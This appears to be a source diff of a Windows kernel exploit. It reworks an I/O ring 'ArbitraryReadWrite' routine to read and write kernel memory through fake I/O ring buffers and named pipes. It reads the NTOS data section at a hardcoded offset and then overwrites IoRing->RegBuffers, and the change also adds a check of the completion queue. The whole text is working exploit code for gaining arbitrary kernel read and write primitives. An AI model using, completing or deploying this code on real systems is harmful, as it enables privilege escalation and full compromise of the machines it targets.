@@ -609,15 +609,18 @@ ArbitraryReadWrite (
     IORING_HANDLE_REF requestDataFile = IoRingHandleRefFromHandle(0);
     IORING_BUFFER_REF requestDataBuffer = IoRingBufferRefFromPointer(0);
     UINT32 submittedEntries;
-    HANDLE exploitOutputFile;
-    HANDLE exploitInputFile;
     PVOID zeroBuf;
     ULONG bytesWritten;
+    IORING_CQE cqe;
+
+    HANDLE outputClientPipe;
+    HANDLE inputClientPipe;
+    HANDLE inputPipe;
+    HANDLE outputPipe;
 
     PVOID addressForFakeBuffers;
     PULONG64 fake_buffers;
     ULONG flagsAndAttributes;
-    PIOP_MC_BUFFER_ENTRY mcBufferEntry;
     PIORING_OBJECT ioringAddress;
     ULONG numberOfFakeBuffers;
     ULONG64 zeroAddress;
@@ -628,12 +631,13 @@ ArbitraryReadWrite (
     PVOID ntosBase;
     ULONG ntosSize;
 
-    exploitOutputFile = NULL;
-    exploitInputFile = NULL;
     fake_buffers = nullptr;
-    mcBufferEntry = nullptr;
     numberOfFakeBuffers = 0x100;
     addressForFakeBuffers = NULL;
+    inputPipe = INVALID_HANDLE_VALUE;
+    outputPipe = INVALID_HANDLE_VALUE;
+    inputClientPipe = INVALID_HANDLE_VALUE;
+    outputClientPipe = INVALID_HANDLE_VALUE;
 
     result = IsMcBufferEntrySupported(&mcBufferArraySupported);
     if (!SUCCEEDED(result))
@@ -696,18 +700,31 @@ ArbitraryReadWrite (
                                            fake_buffers,
                                            numberOfFakeBuffers);
     }
-    if (!SUCCEEDED(result))
+    if (result != S_OK)
     {
         printf("Failed overwriting I/O ring fields: 0x%x\n", result);
         goto Exit;
     }
 
     //
-    // Create a file for the input/output of the I/O operations
-    // use access GENERIC_WRITE for arbitrary read primitive or GENERIC_READ for arbitrary write primitive
+    // Create named pipes for the input/output of the I/O operations
+    // and open client handles for them
     //
+    inputPipe = CreateNamedPipe(INPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
+    if (inputPipe == INVALID_HANDLE_VALUE)
+    {
+        printf("Failed to create input pipe: 0x%x\n", GetLastError());
+        goto Exit;
+    }
+    outputPipe = CreateNamedPipe(OUTPUT_PIPE_NAME, PIPE_ACCESS_DUPLEX, PIPE_WAIT, 255, 0x1000, 0x1000, 0, NULL);
+    if (outputPipe == INVALID_HANDLE_VALUE)
+    {
+        printf("Failed to create output pipe: 0x%x\n", GetLastError());
+        goto Exit;
+    }
+
     flagsAndAttributes = FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED;
-    exploitOutputFile = CreateFile(OUTPUT_FILE_NAME,
+    outputClientPipe = CreateFile(OUTPUT_PIPE_NAME,
                                    GENERIC_READ | GENERIC_WRITE,
                                    FILE_SHARE_READ | FILE_SHARE_WRITE,
                                    NULL,
@@ -715,13 +732,13 @@ ArbitraryReadWrite (
                                    flagsAndAttributes,
                                    NULL);
 
-    if (exploitOutputFile == INVALID_HANDLE_VALUE)
+    if (outputClientPipe == INVALID_HANDLE_VALUE)
     {
         printf("Failed to open handle to output file: 0x%x\n", GetLastError());
         goto Exit;
     }
 
-    exploitInputFile = CreateFile(INPUT_FILE_NAME,
+    inputClientPipe = CreateFile(INPUT_PIPE_NAME,
                                   GENERIC_READ | GENERIC_WRITE,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE,
                                   NULL,
@@ -729,9 +746,9 @@ ArbitraryReadWrite (
                                   flagsAndAttributes,
                                   NULL);
 
-    if (exploitInputFile == INVALID_HANDLE_VALUE)
+    if (inputClientPipe == INVALID_HANDLE_VALUE)
     {
-        printf("Failed to open handle to input file: 0x%x\n", GetLastError());
+        printf("Failed to open handle to input pipe: 0x%x\n", GetLastError());
         goto Exit;
     }
 
@@ -756,17 +773,19 @@ ArbitraryReadWrite (
     //
     // Setup the buffer entry for our arbitrary kernel read
     // 0xC00000 is the offset of the data section in NTOS, hardcoded due to laziness
+    // Use "write" operation to write data into the client handle of the pipe, that we'll
+    // later read from using the server's handle. 
     //
     result = SetupBufferEntry(mcBufferArraySupported,
                               fake_buffers,
                               numberOfFakeBuffers,
                               (PVOID)((ULONG64)ntosBase + 0xC00000),
-                               KERNEL_READ_SIZE,
-                               &newBufferIndex);
+                              KERNEL_READ_SIZE,
+                              &newBufferIndex);
     requestDataBuffer = IoRingBufferRefFromIndexAndOffset(newBufferIndex, 0);
-    requestDataFile = IoRingHandleRefFromHandle(exploitOutputFile);
+    requestDataFile = IoRingHandleRefFromHandle(outputClientPipe);
     //
-    // arbitrary read
+    // Queue arbitrary read
     //
     printf("Reading kernel data...\n");
     result = BuildIoRingWriteFile(handle,
@@ -790,22 +809,31 @@ ArbitraryReadWrite (
         goto Exit;
     }
     //
-    // todo: check the completion queue for the actual status code for the operation
+    // Check the completion queue for the actual status code for the operation
     //
+    result = PopIoRingCompletion(handle, &cqe);
+    if ((!SUCCEEDED(result)) || (!NT_SUCCESS(cqe.ResultCode)))
+    {
+        printf("Failed reading kernel memory 0x%x\n", cqe.ResultCode);
+        goto Cleanup;
+    }
     printf("Successfully read kernel data\n");
 
+    ReadExploitFile(outputPipe);
+
+Cleanup:
     //
     // Queue a final I/O operation to zero out IoRing->RegBuffers.
-    // First, write 0 into the input file, so we can use it for our arbitrary write.
+    // First, write 0 into the input pipe, so we can use it for our arbitrary write.
     //
     zeroBuf = 0;
     RtlZeroMemory(&overlapped, sizeof(overlapped));
-    if (WriteFile(exploitInputFile, &zeroBuf, sizeof(PVOID), &bytesWritten, &overlapped) == FALSE)
+    if (WriteFile(inputPipe, &zeroBuf, sizeof(PVOID), &bytesWritten, &overlapped) == FALSE)
     {
         result = GetLastError();
         if (result == ERROR_IO_PENDING)
         {
-            if (GetOverlappedResult(exploitInputFile, &overlapped, &bytesWritten, TRUE) == FALSE)
+            if (GetOverlappedResult(inputClientPipe, &overlapped, &bytesWritten, TRUE) == FALSE)
             {
                 result = GetLastError();
                 goto Exit;
@@ -815,6 +843,7 @@ ArbitraryReadWrite (
 
     //
     // Setup another buffer entry, with the address of ioring->RegBuffers as the target
+    // Use the client's handle of the input pipe for the read operation
     //
     result = SetupBufferEntry(mcBufferArraySupported,
                               fake_buffers,
@@ -823,7 +852,7 @@ ArbitraryReadWrite (
                               sizeof(PVOID),
                               &newBufferIndex);
     requestDataBuffer = IoRingBufferRefFromIndexAndOffset(1, 0);
-    requestDataFile = IoRingHandleRefFromHandle(exploitInputFile);
+    requestDataFile = IoRingHandleRefFromHandle(inputClientPipe);
 
     result = BuildIoRingReadFile(handle,
                                  requestDataFile,
@@ -845,20 +874,24 @@ ArbitraryReadWrite (
         goto Exit;
     }
 
-    ReadExploitFile(exploitOutputFile);
-
     result = S_OK;
 
 Exit:
-    if (exploitOutputFile != INVALID_HANDLE_VALUE)
+    if (outputPipe != INVALID_HANDLE_VALUE)
     {
-        CloseHandle(exploitOutputFile);
-        DeleteFile(OUTPUT_FILE_NAME);
+        CloseHandle(outputPipe);
     }
-    if (exploitInputFile != INVALID_HANDLE_VALUE)
+    if (inputPipe != INVALID_HANDLE_VALUE)
     {
-        CloseHandle(exploitInputFile);
-        DeleteFile(INPUT_FILE_NAME);
+        CloseHandle(inputPipe);
+    }
+    if (outputClientPipe != INVALID_HANDLE_VALUE)
+    {
+        CloseHandle(outputClientPipe);
+    }
+    if (inputClientPipe != INVALID_HANDLE_VALUE)
+    {
+        CloseHandle(inputClientPipe);
     }
     if (fake_buffers != nullptr)
     {
